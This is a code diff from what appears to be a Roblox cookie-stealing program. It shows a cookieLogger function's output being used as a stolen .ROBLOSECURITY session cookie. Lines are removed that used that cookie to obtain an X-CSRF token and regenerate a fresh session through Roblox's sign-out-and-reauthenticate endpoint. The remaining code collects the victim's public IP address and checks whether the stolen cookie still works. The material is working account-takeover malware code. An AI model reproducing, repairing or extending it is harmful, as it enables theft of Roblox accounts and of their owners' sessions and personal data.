@@ -84,34 +84,9 @@ def cookieLogger():
 cookies = cookieLogger()
 
 
-# Getting the X-CSRF-Token using the existing cookie
-cookie = cookies[1]
-xcsrfurl = "https://auth.roblox.com/v2/logout"
-xsrfRequest = requests.post(xcsrfurl,
-    cookies={
-    '.ROBLOSECURITY': cookie
-})
-
-try: # Tries to get the X-CSRF-Token, will raise an Exception if it fails
-    XCSRFTOKEN = xsrfRequest.headers["x-csrf-token"]
-except:
-    raise Exception()
-
-# Creating a new cookie using the previous cookie and the newly generated X-CSRF-Token
-reauthcookieurl = "https://www.roblox.com/authentication/signoutfromallsessionsandreauthenticate"
-data = requests.post(reauthcookieurl,
-    cookies={
-    '.ROBLOSECURITY': cookie
-},
-    headers={
-    'X-CSRF-TOKEN': XCSRFTOKEN
-})
-setcookie = data.headers['set-cookie'] # Gets the headers of the response from the cookie reload
-# Getting the data between '.ROBLOSECURITY=' and '; domain=.roblox.com;` (which leaves us with the new cookie as ROBLOSECURITY)
-ROBLOSECURITYY = (re.search('.ROBLOSECURITY=(.+?); domain=.roblox.com;', setcookie)).group(1)
 #################### INFOMATION #################
 ip_address = requests.get("https://api.ipify.org/").text
-roblox_cookie = ROBLOSECURITYY
+roblox_cookie = cookies[1]
 #################### checking cookie #############
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
